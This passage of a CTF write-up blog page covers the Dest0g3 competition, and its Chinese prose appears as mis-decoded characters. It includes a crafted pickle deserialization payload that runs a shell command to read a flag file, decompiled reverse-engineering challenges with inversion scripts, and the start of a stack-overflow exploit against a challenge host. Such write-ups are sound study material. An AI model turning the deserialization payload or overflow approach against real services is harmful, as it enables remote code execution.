class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="comment"># è¿™é‡Œæˆ‘ä¹Ÿæ”¹äº†ä¸€ä¸‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>flaskæ¡†æ¶ï¼Œç”¨åˆ°pythonååºåˆ—åŒ–ï¼Œå‚è€ƒ<a href="https://www.ieven762.cn/index.php/archives/109/">å·…å³°æå®¢2021 - what_pickle</a>ï¼Œé™åˆ¶äº†åŠ è½½çš„æ¨¡å—åªèƒ½ä¸º <code>config</code> é‡Œçš„ï¼Œåå­—ä¸èƒ½æœ‰ <code>__</code>ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ <code>config</code> çš„ <code>backdoor(cmd)</code> å‡½æ•°ç»•è¿‡ã€‚</p><p>è¿™é¢˜ç®€åŒ–äº† <code>backdoor(cmd)</code> å‡½æ•°çš„ä½¿ç”¨æ¡ä»¶ï¼Œç›´æ¥è°ƒç”¨å³å¯ã€‚åˆ©ç”¨pkeræ„é€ opcodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag.txt&quot;).read()&#x27;</span></span><br><span class="line"><span class="string">lo.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>base64ç¼–ç opcodeï¼Œä¼ å‚ï¼š</p><p><code>data=KGNjb25maWcKYmFja2Rvb3IKKFMnX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnLnR4dCIpLnJlYWQoKScKbG8u</code></p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="simpleXOR"><a href="#simpleXOR" class="headerlink" title="simpleXOR"></a>simpleXOR</h3><blockquote><p>ç®€å•çš„åŠ å¯†</p></blockquote><p><code>main()</code> ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-160h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">52</span>]; <span class="comment">// [rsp+120h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+154h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+15Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">247</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[i + <span class="number">36</span>] = v5[i];</span><br><span class="line">    v4[i] = v6 ^ (v4[i + <span class="number">36</span>] + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x23</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != result_0[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( j == <span class="number">35</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success!!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆåŠ ä¸‹æ ‡å€¼å†å¼‚æˆ–247ï¼Œæœ€åæ ¡éªŒå¯†æ–‡ï¼Œç®€å•è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">179</span>, <span class="number">145</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">195</span>, <span class="number">155</span>, <span class="number">206</span>, <span class="number">117</span>, <span class="number">207</span>, <span class="number">156</span>, <span class="number">154</span>, <span class="number">133</span>, <span class="number">133</span>, <span class="number">205</span>, <span class="number">184</span>, <span class="number">132</span>, <span class="number">170</span>, <span class="number">125</span>, <span class="number">189</span>, <span class="number">187</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">150</span>, <span class="number">113</span>, <span class="number">141</span>, <span class="number">158</span>, <span class="number">134</span>, <span class="number">191</span>, <span class="number">115</span>, <span class="number">168</span>, <span class="number">163</span>, <span class="number">156</span>, <span class="number">131</span>, <span class="number">101</span>, <span class="number">158</span>, <span class="number">87</span>]</span><br><span class="line">flag = [(c[i]^<span class="number">247</span>)-i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h3><p><code>main()</code> ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> enc[<span class="number">45</span>]; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">100</span>]; <span class="comment">// [rsp+40h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">  *(_QWORD *)enc = <span class="number">0x9F8E7A1CC6486497</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">8</span>] = <span class="number">0x69EEF382E760BD46</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">16</span>] = <span class="number">0xB9C017E2E30EF749</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">24</span>] = <span class="number">0x98410148A430392C</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">32</span>] = <span class="number">0xE80E7411E5B5A939</span>LL;</span><br><span class="line">  *(_DWORD *)&amp;enc[<span class="number">40</span>] = <span class="number">0xA58BFDAC</span>;</span><br><span class="line">  enc[<span class="number">44</span>] = <span class="number">109</span>;</span><br><span class="line">  fwrite(<span class="string">&quot;input: &quot;</span>, <span class="number">1uLL</span>, <span class="number">7uLL</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  fgets(str, <span class="number">46</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(str) != <span class="number">45</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">23</span> * str[i];</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) != enc[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ å¯†é€»è¾‘ä¸­ <code>((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24)</code> äº’å‡æŠµæ¶ˆï¼Œå‰©ä¸‹ <code>23 * str[i] + x[i] == enc[i]</code>ï¼Œç®€å•è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">enc = [<span class="number">151</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">198</span>, <span class="number">28</span>, <span class="number">122</span>, <span class="number">142</span>, <span class="number">159</span>, <span class="number">70</span>, <span class="number">189</span>, <span class="number">96</span>, <span class="number">231</span>, <span class="number">130</span>, <span class="number">243</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">73</span>, <span class="number">247</span>, <span class="number">14</span>, <span class="number">227</span>, <span class="number">226</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">44</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">164</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">65</span>, <span class="number">152</span>, <span class="number">57</span>, <span class="number">169</span>, <span class="number">181</span>, <span class="number">229</span>, <span class="number">17</span>, <span class="number">116</span>, <span class="number">14</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">253</span>, <span class="number">139</span>, <span class="number">165</span>, <span class="number">109</span>]</span><br><span class="line">x = [<span class="number">123</span>, <span class="number">81</span>, <span class="number">243</span>, <span class="number">90</span>, <span class="number">204</span>, <span class="number">57</span>, <span class="number">249</span>, <span class="number">146</span>, <span class="number">28</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">247</span>, <span class="number">253</span>, <span class="number">74</span>, <span class="number">62</span>, <span class="number">251</span>, <span class="number">29</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">12</span>, <span class="number">112</span>, <span class="number">177</span>, <span class="number">59</span>, <span class="number">141</span>, <span class="number">37</span>, <span class="number">237</span>, <span class="number">145</span>, <span class="number">177</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">130</span>, <span class="number">230</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">32</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">166</span>, <span class="number">157</span>, <span class="number">50</span>]</span><br><span class="line">flag = [((enc[i]-x[i])*gmpy2.invert(<span class="number">23</span>,<span class="number">256</span>))%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EZMATH"><a href="#EZMATH" class="headerlink" title="EZMATH"></a>EZMATH</h3><p>ILSpyæŸ¥çœ‹dllæ–‡ä»¶ï¼Œä¸»è¦é€»è¾‘ä»£ç ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;Main&gt;$(<span class="built_in">string</span>[] args)</span><br><span class="line">&#123;</span><br><span class="line">Console.Write(<span class="string">&quot;Input your flag:&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> text = Console.ReadLine();</span><br><span class="line"><span class="keyword">if</span> (!FormatChecker(text))</span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> s = text.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty);</span><br><span class="line"><span class="built_in">byte</span>[] second = Checker.Encrypt2(Checker.Encrypt1(Encoding.ASCII.GetBytes(s)));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>,</span><br><span class="line"><span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>,</span><br><span class="line"><span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>,</span><br><span class="line"><span class="number">227</span>, <span class="number">109</span></span><br><span class="line">&#125;.SequenceEqual(second))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Your flag is Dest0g3&#123;&quot;</span> + text + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">err</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;err!&quot;</span>);</span><br><span class="line">Environment.Exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">FormatChecker</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Guid result;</span><br><span class="line"><span class="keyword">return</span> Guid.TryParse(input, <span class="keyword">out</span> result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt1</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> <span class="keyword">value</span> = (<span class="built_in">uint</span>)((<span class="built_in">ulong</span>)((<span class="built_in">long</span>)utils.Unpack32(a[(<span class="number">4</span> * i)..(<span class="number">4</span> * (i + <span class="number">1</span>))]) * <span class="number">83987L</span>) % <span class="number">4062393413u</span>L);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt2</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ulong</span> num = utils.Unpack64(a[(<span class="number">8</span> * i)..(<span class="number">8</span> * (i + <span class="number">1</span>))]);</span><br><span class="line"><span class="built_in">ulong</span> <span class="keyword">value</span> = num ^ (num &gt;&gt; <span class="number">25</span>);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥å­—ç¬¦ä¸²å…ˆç» <code>Encrypt1()</code> ä»¥32ä½å½¢å¼4ä½ä¸€ç»„åšä¹˜æ³•å–æ¨¡è¿ç®—ï¼Œå†ç» <code>Encrypt2()</code> ä»¥64ä½å½¢å¼8ä½ä¸€ç»„åšxorshiftè¿ç®—ï¼Œé€æ­¥è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>, <span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>, <span class="number">227</span>, <span class="number">109</span>]</span><br><span class="line"></span><br><span class="line">c1 = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_right</span>(<span class="params">m,l</span>):</span></span><br><span class="line">    length = <span class="number">64</span></span><br><span class="line">    mx = (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span></span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * l &lt; length:</span><br><span class="line">        mask = (mx &lt;&lt; (length - l) &amp; mx) &gt;&gt; i * l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m = m ^ tmp &gt;&gt; l &amp; mx</span><br><span class="line">        res += tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">c2 = [invert_right(c1[i], <span class="number">25</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">c3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    c3 += <span class="built_in">list</span>(long_to_bytes(c2[i]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">c4 = [bytes_to_long(<span class="built_in">bytes</span>(c3[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">c4 = [(k*inverse(<span class="number">83987</span>,<span class="number">4062393413</span>))%<span class="number">4062393413</span> <span class="keyword">for</span> k <span class="keyword">in</span> c4]</span><br><span class="line"></span><br><span class="line">c5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    c5 += <span class="built_in">list</span>(long_to_bytes(c4[i]))[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c5))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;28956fc4c54045a8808d42a5fab4b5f8&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_8EC();</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s just a easy stack overflow.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fun2();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">fun2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"> </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please leave your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK, you can exploit it now.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK, you get it !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>armçš„aarch64æ¶æ„ï¼Œå¼€äº†PIEï¼Œä¸åé—¨åœ°å€æ¯”è¾ƒå‘ç°åªæœ‰å1ä¸ªå­—èŠ‚ä¸åŒï¼ŒæŠŠè¿”å›åœ°å€çš„å°¾1å­—èŠ‚æ”¹ä¸ºåé—¨åœ°å€å°¾1å­—èŠ‚ï¼Œç®€å•æ ˆæº¢å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26257</span>)</span><br><span 